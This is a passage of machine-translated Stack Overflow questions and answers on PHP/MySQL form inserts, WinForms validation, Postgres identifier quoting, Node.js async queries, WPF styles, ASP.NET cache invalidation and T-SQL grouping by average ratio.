    break;

    }   

    */ needed later on when I insert grid values   

$results = $_POST['value'];
foreach($results as $id => $value) {
$answer = $value;

 $questionsql = "INSERT INTO Question (SessionId, QuestionId) 
    VALUES (?, ?)";

    $sessid =  $_SESSION['id'] . ($_SESSION['initial_count'] > 1 ? $_SESSION['sessionCount'] : '');

    if (!$insert = $mysqli->prepare($questionsql)) {
      // Handle errors with prepare operation here
    }

$insert->bind_param("si", $sessid, $id);

        $insert->execute();

        if ($insert->errno) {
          // Handle query error here
        }

        $insert->close();

        $insert->insert_id;

        foreach($value as $answer) {

         $answersql = "INSERT INTO Answer (SessionId, QuestionId, Answer) 
    VALUES (?, ?, ?)";

      if (!$insertanswer = $mysqli->prepare($answersql)) {
      // Handle errors with prepare operation here
    }  

    $insertanswer->bind_param("sis" $sessid, $lastID, $answer);

        $insertanswer->execute();

        if ($insertanswer->errno) {
          // Handle query error here
        }

        $insertanswer->close();

}

}

} 
```

下面的`var_dump($_POST)`输出：

```
 array(3) { 
["numQuestion"]=> array(2) { 
[0]=> string(1) "1" 
[1]=> string(1) "2" 
}  
["submitDetails"]=> string(14) "Submit Details" ["value"]=> array(4) { 
["answerARow"]=> string(2) "on" 
["answerCRow"]=> string(2) "on" 
["answerBRow"]=> string(2) "on" ["answerERow"]=> string(2) "on"
 } 
} 
```

以下是我收到的错误以及每个错误链接到的代码行：

> 警告：在第 252 行的 /.../ 中为 foreach() 提供的参数无效

```
foreach($value as $answer) { 
```

> 警告：mysqli_stmt::execute(): (23000/1062): 第 242 行 /.../ 中键 'PRIMARY' 的重复条目 'MUL-0'

上面的错误表明没有插入任何问题编号，因为它一直显示为“0”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:37:31.063

所以看起来你要做的主要事情是解决无法皮肤复选框的问题。我以前做过。我这样做的方式是使用绑定到隐藏复选框的跨度。

我使用跨度是因为我不确定表单字段中的按钮是否会在提交表单时发布值。我知道跨度不会。这保证只会提交您的复选框值，而不是“掩盖”值。

在您的 jsFiddle`updateAnswer()`函数中，您有以下代码：

```
if (!bDisableAppend) {
    // append those values to the form
    var input = '<input type="checkbox" id="' + hid + '" name="value[' + id + ']" checked /><label for="' + hid + '">' + value + '</label>';
    _oCurrAnswerContainer.append(input);
} 
```

在该代码中，您将`name`复选框的属性设置为类似`value[answerARow]`. 那就是你的问题所在。

TBH，我很难遵循您的代码，因此我提出的解决方案可能需要进行一些调整，以添加我在您的示例中遗漏的任何隐藏技巧。但这是我想出的：

**[jsFiddle](http://jsfiddle.net/eg5QU/3/)**

**JS/jQuery：**

```
var options = ["A", "B", "C", "D", "E", "F", "G", "H"];

// this will bind the event handler to the document element, so that even when a new element is created,
// the event will be automatically bound to it.
$(document).on("click", "span.checkbox", function() {
    $("#chk"+ $(this).attr("id")).click();
    $(this).toggleClass("unselected selected");
});

$("#btnAddQuestion").click(function() {
    var questionNum = $("#tblQuestions tbody tr").length+1;

    var cell = $(document.createElement("td")).addClass("optAns").html("Answer:<br />");

    // loop through the options and add them to the cell
    for (var i in options)    
    {
        $(cell).append(
            // the front-end overlay for the checkbox
            $(document.createElement("span"))
                .addClass("checkbox unselected")
                .attr("id", "Value"+ questionNum + options[i])
                .html(options[i])
        ).append(
            // the hidden checkbox that will post the actual value
            $(document.createElement("input"))
                .attr("type", "checkbox")
                .addClass("hidden")
                .attr("id", "chkValue"+ questionNum + options[i])
                .attr("name", "value["+ questionNum +"][]")
                .attr("value", options[i])
        );
    }

    // create a new table row, append the "option and answer" cell
    // and question number cell, and append it to the table body
    $(document.createElement("tr"))
        .append(cell)
        .append($(document.createElement("td")).addClass("questionNum").html(questionNum))
        .appendTo("#tblQuestions tbody");
}); 
```

**HTML：**

```
<div id="detailsBlock">
    <button id="btnAddQuestion">Add Question</button>
</div>
<hr />
<div id="details">
    <table id="tblQuestions">
        <thead>
            <tr>
                <th>Option and Answer</th>
                <th>Question No</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:50:07.110

您当前的代码会生成此代码（注意 bad name 属性）：

```
<input type="button" onclick="btnclick(this, 1);" style="display:inline-block;" class="answerBtns answers answerBtnsOff" name="value[answerF]" value="F" id="answerHRow"> 
```

请注意， name 属性`value[answerF]`不是`value[1][]`您在问题中所写的。

更新您的 javascript 并将该`$newBtn`行更改为：

```
 var $newBtn = $(("<input class='answerBtnsRow answers' type='button' style='display:%s;' onclick='btnclick(this, " + gQuestionIndex + ");' />").replace('%s', $this.is(':visible') ? 'inline-block' : 'none')).attr('name', "value[" + gQuestionIndex + "][]").attr('value', $this.val()).attr('class', $this.attr('class')).attr('id', $this.attr('id') + 'Row'); 
```

# c# - winforms中的验证文本框

> ID：12866314
> 
> 赞同：1
> 
> 时间：2012-10-12T20:04:51.810
> 
> 标签：c#, .net, winforms

如何在winforms中验证文本框控件中的文本？
我有一个控件，用户必须在其中放置字符串，例如“13:55”。我想显示 MessageBox，当这个值将不同时，而不是“XX：YY”。
怎么做？
在asp.net中很容易制作，但是如何在winforms上实现呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:07:46.273

如果您不想首先验证，请查看[MaskedTextBox 。](http://msdn.microsoft.com/en-us/library/system.windows.forms.maskedtextbox.aspx)

```
var l_control = new MaskedTextBox();
l_control.Mask = "00\:00"; 
```

如果要使第一个数字可选：

```
l_control.Mask = "90\:90"; 
```

否则，您可以使用[正则表达式](http://msdn.microsoft.com/en-us/library/hs600312.aspx)。用冒号分隔的 4 位数字是：`@"^\d{2}:\d{2}$"`. （该`@`符号阻止 C# 将 '\' 视为转义字符 - 正则表达式没有任何独特之处。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:09:58.287

[http://windowsclient.net/learn/videos.aspx](http://windowsclient.net/learn/videos.aspx)上有三个验证视频，将引导您完成整个过程。

但使用蒙版文本框可能更容易，具体取决于您收集的数据。

哎呀，对于您正在做的事情，您可以非常安全并使用两个 NumericUpDown 控件，而根本不必处理验证。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:09:21.680

你应该看看 C# [Regex](http://www.mikesdotnetting.com/Article/46/CSharp-Regular-Expressions-Cheat-Sheet)

```
Match match = Regex.Match(input, "^\d\d:\d\d$"));

if (!match.Success) MessageBox.Show("Error"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:43:45.380

您也可以使用[ErrorProvider](http://msdn.microsoft.com/en-us/library/a0d996e0.aspx)而不是弹出消息框。[msdn 上提供了ErrorProvider 类](http://msdn.microsoft.com/en-us/library/system.windows.forms.errorprovider.aspx)的示例。基本上你订阅了 Validated 事件

```
this.nameTextBox1.Validated += nameTextBox1Validated; 
```

然后检查该值是否有效

```
private void nameTextBox1Validated(object sender, EventArgs e) {
    if(isNameValid()) {
        // clear error
        nameErrorProvider.SetError(nameTextBox1, String.Empty);
    }
    else {
        // set some helpful message
        nameErrorProvider.SetError(nameTextBox1, "Invalid value.");
    }
}

private bool isNameValid() {
    // The logic for determining if a value is correct
    return nameTextBox1.Text == "hello";
} 
```

可以像这样创建错误提供程序

```
ErrorProvider nameErrorProvider = new ErrorProvider();
nameErrorProvider.SetIconAlignment(nameTextBox1, ErrorIconAlignment.MiddleRight);
nameErrorProvider.SetIconPadding(nameTextBox1, 2);
nameErrorProvider.BlinkRate = 1000;
nameErrorProvider.BlinkStyle = ErrorBlinkStyle.AlwaysBlink; 
```

# java - 带有Java的Postgres我无法插入数据

> ID：12866326
> 
> 赞同：3
> 
> 时间：2012-10-12T20:05:48.503
> 
> 标签：java, postgresql, sql-insert, quoted-identifier

我试图用 Java 插入我的 postgres 数据库。我的本地数据库有默认配置。

我想将一些数据放在一个表中，但我遇到了一些问题。

这是代码：

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.logging.Level;
import java.util.logging.Logger;

public static void main(String[] args) {

    Connection con = null;
    PreparedStatement pst = null;

    String url = "jdbc:postgresql://localhost/postgres";
    String user = "postgres";
    String password = "thanassis";

    try {

        con = DriverManager.getConnection(url, user, password);

        String stm = "INSERT INTO TEST2(ID) VALUES(?)";
        pst = con.prepareStatement(stm);
        pst.setInt(1, 1);

        pst.executeUpdate(); 

    } catch (SQLException ex) {
        Logger lgr = Logger.getLogger(PreparedStatement.class.getName());
        lgr.log(Level.SEVERE, ex.getMessage(), ex);

    } finally {

        try {
            if (pst != null) {
                pst.close();
            }
            if (con != null) {
                con.close();
            }

        } catch (SQLException ex) {
            Logger lgr = Logger.getLogger(PreparedStatement.class.getName());
            lgr.log(Level.SEVERE, ex.getMessage(), ex);
        }
    }
} 
```

这里有例外

```
严重：错误：关系“test2”不存在
  职位：13
org.postgresql.util.PSQLException：错误：关系“test2”不存在
  职位：13
    在 org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2101)
    在 org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1834)
    在 org.postgresql.core.v3.QueryExecutorImpl.execute（QueryExecutorImpl.java:255）
    在 org.postgresql.jdbc2.AbstractJdbc2Statement.execute（AbstractJdbc2Statement.java:510）
    在 org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags（AbstractJdbc2Statement.java:386）
    在 org.postgresql.jdbc2.AbstractJdbc2Statement.executeUpdate（AbstractJdbc2Statement.java:332）
    在 test.Test.main(Test.java:30)

```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:20:40.873

你的桌子叫做`TEST2`not `test2`。显然，您使用双引号创建了它，这使得 Postgres（和其他符合标准的 DBMS）区分大小写。

因此，您现在必须在每次引用表时用双引号将名称括起来。

```
String stm = "INSERT INTO \"TEST2\"(ID) VALUES(?)"; 
```

很可能这不是您想要的，因此只需重新创建表**而不**在标识符周围使用双引号：

```
CREATE TABLE test2
(
  ...
) 
```

创建一个不同的表：

```
CREATE TABLE "test2"
(
  ...
) 
```

如果您不想重新创建表，可以重命名它们：

```
alter table "TEST2" rename to test2; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:10:21.477

表 test2 不存在。尝试登录 PostgreSQL 并检查此表。

您可以使用命令行实用程序列出数据库中的所有现有表

```
psql -d postgres
\dt 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-29T18:49:21.500

检查您在其中创建表 test2 的架构。如果它是不在搜索路径中的模式之一，那么您有两个选择：-

*   将架构添加到您的 search_path（文件 postgres.conf 中的逗号分隔列表）
*   通过在表名前面加上模式名称和点来引用表。例如，如果相关表 test2 在 my_schema 中，那么您的查询应该是
    `insert into my_schema.test2(ID) values(?)`.

# javascript - 寻找有关nodeJs的mysql模块的一些帮助

> ID：12866327
> 
> 赞同：2
> 
> 时间：2012-10-12T20:06:03.733
> 
> 标签：javascript, mysql, node.js

我正在尝试与 nodeJs 服务器和 mysql 数据库聊天。

我决定在这里制作一个模块（名为 Mysqler）：

```
var mysql = require('mysql');

var Mysqler = function(query) {
    var connection = mysql.createConnection({
            host     : 'localhost',
            user     : 'root',
            password : '',
            database : 'watchat',
        });

    connection.connect();
    Mysqler.prototype.query = function (query) {
        var res = mysql.query(query, function(err, result, fields) {
                console.log(result);
                if (err) throw err;
                else return result;
            });

        console.log(res);
        return res;
    };

};

module.exports.Mysqler = Mysqler 
```

但是当我用我的函数调用它时：

```
mysql = require("./mysqler");

function connection(clients, socket, data) {
    var username = usefull.deleteBreakLine(data[1]);
    var password = usefull.deleteBreakLine(data[2]);

    var result = mysql.Mysqler("SELECT * FROM Users");
    for (var i in result)
        {
            var user = result[i];
            socket.write(user.username);
        }
} 
```

但是没有任何东西返回到我的结果变量中。当我将 console.log() 放在我的模块中时，没有打印任何内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:25:27.690

也许你可以尝试这样的事情：

```
var mysql = require('mysql');

var Mysqler = (function() {
    var connection = mysql.createConnection({
            host     : 'localhost',
            user     : 'root',
            password : '',
            database : 'watchat',
        });

    connection.connect();

    return {
        query: function (query,cb) {
            var res = mysql.query(query, function(err, result, fields) {
                console.log(result);
                if (err) throw err;
                else cb(result);
            });
        };
    }

})();

module.exports = Mysqler; 
```

和：

```
var mysql = require("./mysqler");

function connection(clients, socket, data) {
    var username = usefull.deleteBreakLine(data[1]);
    var password = usefull.deleteBreakLine(data[2]);

    mysql.query("SELECT * FROM Users",function(result){
        for (var i in result)
        {
            var user = result[i];
            socket.write(user.username);
        }
    });

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:14:18.893

1.  Mysql`query`方法是异步的。您试图从回调返回结果。这是绝对错误的方式。您需要通过将结果作为参数传递给回调函数来返回结果。
2.  您试图调用对象的方法`query`而`mysql`不是`connection`.

# wpf - 未应用 generic.xaml 中引用的样式

> ID：12866328
> 
> 赞同：2
> 
> 时间：2012-10-12T20:06:14.003
> 
> 标签：wpf, xaml

我在 Generic.xaml 中有这种风格

```
<Style x:Key="WhiteHyperlink" TargetType="Hyperlink">
    <Setter Property="Foreground" Value="White" />
</Style> 
```

我在资源字典中有这一行

```
<Style TargetType="{x:Type Hyperlink}" BasedOn="{StaticResource WhiteHyperlink}" /> 
```

我想把它应用到这个：

```
<Textblock Grid.Colum="2" >
    <Hyperlink Command="{StaticResource ExecuteMailAction}" CommandParameter="{Binding Path=MailboxID}">
        <TextBlock Text="{Binding Path=MailboxName}" />
    </Hyperlink>
</Textblock> 
```

但是没有应用格式。我错过了什么？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:42:54.510

我查看了 Generic.xaml ，似乎只有在设置样式的控件不是依赖于主题的默认样式时，才应用 Generic.xaml 中的样式。（[Generic.xaml 有什么特别之处？](https://stackoverflow.com/questions/1228875/what-is-so-special-about-generic-xaml)）我猜它`Hyperlink`的默认样式取决于操作系统的主题，这就是为什么您的样式没有从 Generic.xaml 中提取出来的原因。我建议不要使用 Generic.xaml 来存储您的样式，而是创建一个单独的文件来存储您的所有样式（MyStyles.xaml 或类似的东西）。然后只需使用`ResourceDictionary`s 从该文件中获取样式。

# asp.net - 如果 PostgreSql 数据库中的数据发生更改，如何使 ASP.NET 缓存无效

> ID：12866333
> 
> 赞同：2
> 
> 时间：2012-10-12T20:06:32.863
> 
> 标签：asp.net, asp.net-mvc, postgresql, caching, mono

ASP.NET/MONO MVC2 应用标准 ASP.NET Web 缓存用于加速数据库访问：

```
string GetName() {
  // todo: dedect if data has changed and invalidate cache
  var name = (string)HttpContext.Current.Cache["Name"];
  if (name!=null)
    return name;
  name = db.Query("SELECT name from mydata");
  HttpContext.Current.Cache.Insert("Name", name);
  return name;
} 
```

mydata 可以被其他应用程序更改。在这种情况下，此方法返回错误数据。在这种情况下，如何检测数据是否更改并从 PostgreSql 数据库返回新数据？

如果 mydata 已更改，则可以清除整个 Web 缓存。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-13T01:17:11.060

最好的方法可能是使用[`LISTEN`and`NOTIFY`](http://www.postgresql.org/docs/current/static/sql-listen.html)。

让您的应用程序维护一个后台工作人员，并与数据库保持持久连接。在这方面，发出 a `LISTEN name_changed`，然后等待通知。如果 npgsql 支持它，它可能会提供回调；否则你将不得不投票。

将触发器添加到`name`发出`NOTIFY name_changed`.

当您的后台工作人员收到通知时，它可以刷新缓存。

您甚至可以使用`NOTIFY`有效负载选择性地使更改的条目无效。

# algorithm - 根据平均值选择不同的行组

> ID：12866338
> 
> 赞同：8
> 
> 时间：2012-10-12T20:07:05.317
> 
> 标签：algorithm, sql-server-2008, c#-4.0, linq-to-sql

我有`t_stats`column`id (INT)`和 column的表格`ratio (DECIMAL(8,4))`。 `id`是独特的。

我想查询表`t_stats`以选择 3 个相同的组`AVG(ratio)`（尽可能接近）。

可以使用临时表来完成，只要我可以将它作为脚本或存储过程运行。

* * *

编辑：这是具体的例子：

输入：

```
id    ratio
--    -----
24  0.930000
25  0.390000
26  0.800000
27  0.920000
28  0.550000
30  0.810000
31  0.770000
32  0.800000
33  0.590000
36  0.760000
37  0.910000
40  0.690000
43  0.390000
45  0.310000
46  0.760000
47  0.710000
54  0.710000
55  0.950000
57  0.920000
60  0.890000
62  0.700000
66  0.890000
68  0.950000
107 0.760000
559 0.990000
560 0.540000
565 0.430000
566 0.830000
568 0.590000
579 0.970000
599 0.900000
623 0.450000
749 0.800000
750 0.970000
753 0.820000
754 0.730000
766 0.620000
768 0.430000
770 0.790000
838 0.700000
875 0.835000
987 0.900000
988 0.740000
1157    0.850000
1250    0.630000
1328    0.860000
2171    0.900000
2176    0.520000
2177    0.980000
2178    0.940000
2180    0.970000
2184    0.990000
2187    0.950000
2188    0.940000
2189    0.920000
2195    0.990000
2233    0.900000
2234    0.940000
2235    0.950000
2240    0.980000
2243    0.920000
2253    0.900000
2266    0.530000
2269    0.920000
2270    0.970000
2271    0.750000
2272    0.820000
2275    0.910000
2277    0.930000
2281    0.690000
2282    0.710000
2288    0.840000
2528    0.870000
2778    0.950000
2814    0.990000 
```

输出：

```
groupId    id     ratio
-------    --     -----
1       24      0.930000
1       25      0.390000
1       27      0.920000
1       30      0.810000
1       32      0.800000
1       36      0.760000
1       54      0.710000
1       60      0.890000
1       559     0.990000
1       560     0.540000
1       566     0.830000
1       568     0.590000
1       623     0.450000
1       750     0.970000
1       838     0.700000
1       987     0.900000
1       1157        0.850000
1       2178        0.940000
1       2180        0.970000
1       2253        0.900000
1       2269        0.920000
1       2271        0.750000
1       2281        0.690000
1       2778        0.950000
1       2814        0.990000
2       26      0.800000
2       28      0.550000
2       31      0.770000
2       40      0.690000
2       45      0.310000
2       55      0.950000
2       57      0.920000
2       66      0.890000
2       107     0.760000
2       565     0.430000
2       579     0.970000
2       753     0.820000
2       754     0.730000
2       766     0.620000
2       875     0.835000
2       1328        0.860000
2       2176        0.520000
2       2177        0.980000
2       2184        0.990000
2       2187        0.950000
2       2189        0.920000
2       2233        0.900000
2       2234        0.940000
2       2275        0.910000
2       2282        0.710000
3       33      0.590000
3       37      0.910000
3       43      0.390000
3       46      0.760000
3       47      0.710000
3       62      0.700000
3       68      0.950000
3       599     0.900000
3       749     0.800000
3       768     0.430000
3       770     0.790000
3       988     0.740000
3       1250        0.630000
3       2171        0.900000
3       2188        0.940000
3       2195        0.990000
3       2235        0.950000
3       2240        0.980000
3       2243        0.920000
3       2266        0.530000
3       2270        0.970000
3       2272        0.820000
3       2277        0.930000
3       2288        0.840000
3       2528        0.870000 
```

所以我想制作 3 组`n`值并以特定的平均值为目标`x`。（例如，`n=30`and`0.75 < x < 0.85`看起来像 3 组，每组 30 个值，每组都有`0.75 < AVG(ratio) < 0.85`，并且`id`只能属于 1 个组。）

所以每组的平均值几乎相同，并且接近`x`：

```
groupId     avg(ratio)
-------     ----------
1           0.805600
2           0.789000
3           0.797600 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T20:44:23.923

这是一个有点像[草稿](http://en.wikipedia.org/wiki/Draft_%28sports%29)的T-SQL程序版本，只是草稿顺序每轮根据需要进行优化。

如果要挑选所有项目，这种“竞争”性质似乎会导致略低于完美比率，但好的一面是你基本上有一个 O(N^2) 算法，因为它本质上是一个 min 函数循环（考虑到这些`group by`条款，也许这是乐观的）。它也是确定性的，如有必要，在另一层中实现应该相当简单。

```
-- SET THESE!
declare @numberOfGroups int = 3
declare @itemsPerGroup int = 25
declare @targetRatio decimal(8,4) = .8
-- /SET

set nocount on

-- Create a table of items
declare @t_stats table (
      id int not null primary key
    , ratio decimal(8,4) not null
    , grp int null
)
insert into @t_stats (id, ratio) values
    (24,0.930000), (25,0.390000), (26,0.800000),
    (27,0.920000), (28,0.550000), (30,0.810000),
    (31,0.770000), (32,0.800000), (33,0.590000),
    (36,0.760000), (37,0.910000), (40,0.690000),
    (43,0.390000), (45,0.310000), (46,0.760000),
    (47,0.710000), (54,0.710000), (55,0.950000),
    (57,0.920000), (60,0.890000), (62,0.700000),
    (66,0.890000), (68,0.950000), (107,0.760000),
    (559,0.990000), (560,0.540000), (565,0.430000),
    (566,0.830000), (568,0.590000), (579,0.970000),
    (599,0.900000), (623,0.450000), (749,0.800000),
    (750,0.970000), (753,0.820000), (754,0.730000),
    (766,0.620000), (768,0.430000), (770,0.790000),
    (838,0.700000), (875,0.835000), (987,0.900000),
    (988,0.740000), (1157,0.850000), (1250,0.630000),
    (1328,0.860000), (2171,0.900000), (2176,0.520000),
    (2177,0.980000), (2178,0.940000), (2180,0.970000),
    (2184,0.990000), (2187,0.950000), (2188,0.940000),
    (2189,0.920000), (2195,0.990000), (2233,0.900000),
    (2234,0.940000), (2235,0.950000), (2240,0.980000),
    (2243,0.920000), (2253,0.900000), (2266,0.530000),
    (2269,0.920000), (2270,0.970000), (2271,0.750000),
    (2272,0.820000), (2275,0.910000), (2277,0.930000),
    (2281,0.690000), (2282,0.710000), (2288,0.840000),
    (2528,0.870000), (2778,0.950000), (2814,0.990000)

-- Create a table of groups
declare @groups table (
    grp int not null primary key identity
)
while (select isnull(max(grp), 0) from @groups) < @numberOfGroups begin
    insert into @groups default values
end

-- Check that we have enough items to fill all groups
if @numberOfGroups * @itemsPerGroup <= (select count(*) from @t_stats) begin

    -- Groups now pick the best-fitting items one at a time
    while (select count(*) from @t_stats where grp is not null) < (select count(*) * @itemsPerGroup from @groups) begin
        declare @grp int, @Num int, @ratio decimal(8,4), @id int

        -- Find the group with the least number of items or the worst ratio
        select top 1 @grp = grp, @Num = Num, @ratio = ratio
        from (
            select g.grp
                , count(i.grp) as Num
                , isnull(avg(i.ratio), 0.0) as ratio
                , abs(@targetRatio - avg(i.ratio)) as RatioDist
            from @groups g
                left join @t_stats i on g.grp = i.grp
            group by g.grp
        ) as a
        order by Num, RatioDist, grp

        -- Let that group make their best pick
        select top 1 @id = id
        from (
            select id
                , abs(((ratio + (@ratio * @Num)) / (@Num + 1)) - @targetRatio) as NewRatioDist
            from @t_stats
            where grp is null
        ) as a
        order by NewRatioDist

        -- Update the items table based upon the pick
        update @t_stats set grp = @grp where id = @id

    end

end
else begin
    -- Not enought items
    raiserror('Too many groups or items per group.', 17, 0)
end

-- Display the results
select grp, count(*) as Num, avg(ratio) as ratio
from @t_stats
group by grp
order by grp 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-13T08:20:12.397

试试这个

```
Declare @t Table (Id Int, Ratio DECIMAL(8,2)) 
Insert Into @t Values(1,0.5),(2,0.55),(3,0.97),(4,0.77),(5,0.97),(6,0.99),(7,1.0),(8,0.15),(9,0.33) 

DECLARE @MeanSum DECIMAL(8,2) 
SELECT @MeanSum =SUM(Ratio)/3 FROM @T 

;WITH Cte (Id,Ratio,Ids,RatioValues,RatioTotalWeight,Level) AS 
( 
    SELECT  Id 
            ,Ratio             
            , ',' + CAST(Id AS VARCHAR(MAX))   
            ,',' + CAST(Ratio AS VARCHAR(MAX)) 
            ,CAST(Ratio AS DECIMAL(8,2)) 
            ,1
    FROM @t 
    UNION ALL 
    SELECT          
            p.Id 
            , p.Ratio             
            ,c.Ids + ',' +  CAST(p.Id AS VARCHAR(MAX)) 
            ,c.RatioValues + ',' +  CAST(p.Ratio AS VARCHAR(MAX))  
            ,CAST(c.RatioTotalWeight + p.Ratio AS DECIMAL(8,2)) 
            ,c.Level+1           
    FROM @t AS p JOIN Cte c ON p.Id < c.Id 
    WHERE c.Level < 3
 ),CTEOf3Groups AS( 
    SELECT  
        Ids = STUFF(Ids,1,1,'') 
        ,RatioValues 
        ,RatioTotalWeight 
        , FirstChar = SUBSTRING(STUFF(Ids,1,1,''),0,CHARINDEX(',',STUFF(Ids,1,1,''))) 
        ,DENSE_RANK() OVER(ORDER BY ABS(RatioTotalWeight - @MeanSum)) [rank] -- gets the closest distance 
    FROM CTE     
),CteGetTheRanks AS( 
Select *, Rn = Row_Number() Over(Partition By FirstChar Order by  FirstChar, [Rank] ) 
From CTEOf3Groups) 
,CteGroups AS( 
SELECT [GroupId] = Row_Number() Over( Order By (Select 1)), Ids,[Rank] 
FROM CteGetTheRanks  
Where [Rank]<=3 
AND Rn = 1) 

SELECT X.[GroupId],X.Id,t.Ratio 
FROM 
    ( 
        SELECT F1.[GroupId],  
         O.splitdata  AS ID 
         FROM 
             ( 
                SELECT *, 
                CAST('<X>'+REPLACE(F.Ids,',','</X><X>')+'</X>' AS XML) AS xmlfilter 
                FROM CteGroups F 
             )F1 
         CROSS APPLY 
         (  
            SELECT fdata.D.value('.','varchar(50)') AS splitdata  
            FROM f1.xmlfilter.nodes('X') As fdata(D) 
         ) O 
    )X JOIN @t t ON t.Id = X.ID 
ORDER BY 1,2 
OPTION (MAXRECURSION 0) 
```

**结果** ![在此处输入图像描述](../Images/0ef111ef2a4aa7ac3ccfe837fe302c26.png)

**编辑** 我尝试使用您提供的样本数据（ddl 供您参考）

```
Declare @t Table (Id Int, Ratio DECIMAL(8,2)) 
Insert Into @t Values
(52,0.930000),(53,0.390000),(54,0.800000),(55,0.920000),(56,0.550000),  
(58,0.810000),(59,0.770000),(60,0.800000),(61,0.590000),(64,0.760000),  
(65,0.910000),(68,0.690000),(71,0.390000),(73,0.310000),(74,0.760000),  
(75,0.710000),(82,0.710000),(83,0.950000),(85,0.920000),(88,0.890000),  
(90,0.700000),(94,0.890000),(96,0.950000),(135,0.760000),(587,0.990000),  
(588,0.540000),(593,0.430000),(594,0.830000),(596,0.590000),(607,0.970000),  
(627,0.900000),(651,0.450000),(777,0.800000),(778,0.970000),(781,0.820000),  
(782,0.730000),(794,0.620000),(796,0.430000),(798,0.790000),(866,0.700000),  
(903,0.835000),(1015,0.900000),(1016,0.740000),(1185,0.850000),(1278,0.630000),  
(1356,0.860000),(2199,0.900000),(2204,0.520000),(2205,0.980000),(2206,0.940000),  
(2208,0.970000),(2212,0.990000),(2215,0.950000),(2216,0.940000),(2217,0.920000),  
(2223,0.990000),(2261,0.900000),(2262,0.940000),(2263,0.950000),(2268,0.980000),  
(2271,0.920000),(2281,0.900000),(2294,0.530000),(2297,0.920000),(2298,0.970000),  
(2299,0.750000),(2300,0.820000),(2303,0.910000),(2305,0.930000),(2309,0.690000),  
(2310,0.710000),(2316,0.840000),(2556,0.870000),(2806,0.950000),(2842,0.990000),  
(2844,0.710000),(2977,0.730000),(2985,0.960000),(3008,0.710000),(3042,0.910000),  
(3061,0.830000),(3243,0.900000),(3346,0.800000),(3371,0.800000),(3497,0.990000),  
(3838,0.730000),(4000,0.980000),(4001,0.890000),(4002,0.850000),(4003,0.490000),  
(4004,0.970000),(4009,0.930000),(4032,0.930000),(4095,0.460000),(4428,0.610000),  
(4438,0.960000),(4439,0.930000),(4445,0.650000),(4446,0.660000),(4447,0.490000),  
(4455,0.880000),(4457,0.890000),(4460,0.980000),(4469,0.930000),(4473,0.980000),  
(4474,0.950000),(4475,0.940000),(4481,0.400000),(4489,0.760000),(4490,0.470000) 
```

结果是

![在此处输入图像描述](../Images/da2e57dc135e595ad67c0da7e426f7e5.png)

执行时间为 27 秒。请从您的角度进行测试（也是结果）并告诉我。

**已编辑**

75 条记录 DDL

```
Declare @t Table (Id Int, Ratio DECIMAL(8,4))  
Insert Into @t Values 
(24,0.930000),(25,0.390000),(26,0.800000),(27,0.920000),
(28,0.550000),(30,0.810000),(31,0.770000),(32,0.800000),
(33,0.590000),(36,0.760000),(37,0.910000),(40,0.690000),
(43,0.390000),(45,0.310000),(46,0.760000),(47,0.710000),
(54,0.710000),(55,0.950000),(57,0.920000),(60,0.890000),
(62,0.700000),(66,0.890000),(68,0.950000),(107,0.760000),
(559,0.990000),(560,0.540000),(565,0.430000),(566,0.830000),
(568,0.590000),(579,0.970000),(599,0.900000),(623,0.450000),
(749,0.800000),(750,0.970000),(753,0.820000),(754,0.730000),
(766,0.620000),(768,0.430000),(770,0.790000),(838,0.700000),
(875,0.835000),(987,0.900000),(988,0.740000),(1157,0.850000),
(1250,0.630000),(1328,0.860000),(2171,0.900000),(2176,0.520000),
(2177,0.980000),(2178,0.940000),(2180,0.970000),(2184,0.990000),
(2187,0.950000),(2188,0.940000),(2189,0.920000),(2195,0.990000),
(2233,0.900000),(2234,0.940000),(2235,0.950000),(2240,0.980000),
(2243,0.920000),(2253,0.900000),(2266,0.530000),(2269,0.920000),
(2270,0.970000),(2271,0.750000),(2272,0.820000),(2275,0.910000),
(2277,0.930000),(2281,0.690000),(2282,0.710000),(2288,0.840000),
(2528,0.870000),(2778,0.950000),(2814,0.990000) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T01:07:20.333

SQL 确实不是解决此类问题的最佳工具。

但是，有时用 TSQL 锤子敲一些螺丝很有趣！

这是一项在您的 75 行示例数据上获得以下结果的努力：

```
 GroupId     Average                                 Count
  ----------- --------------------------------------- -----------
  1           0.798400                                25
  2           0.796600                                25
  3           0.797200                                25 
```

在我的机器上不到一秒钟。
只是一个警告：这种方法有很大的缺陷，但如果你需要在 SQL 中执行此操作，你可能可以在它们上面粘贴一些磁带，我只是没有时间。

```
-- **Expects data in table t_stats (id, ratio)**
if OBJECT_ID('tempdb..#data') is not null drop table #data
if OBJECT_ID('tempdb..#pairsets') is not null drop table #pairsets
if OBJECT_ID('tempdb..#pairseed') is not null drop table #pairseed
if OBJECT_ID('tempdb..#match') is not null drop proc #match
go

-- rather horrible routine using dsql to find either:
--   1) groups of values that sum to exactly @targetsum (only if @targetsum non null)
--   2) the group containing the least values that includes data id @includeid and where the sum is within +- @targetsumrange
create proc #match(@targetsum DECIMAL(8,4), @includeid int, @targetsumrange DECIMAL(8,4)) as
begin
  set nocount on
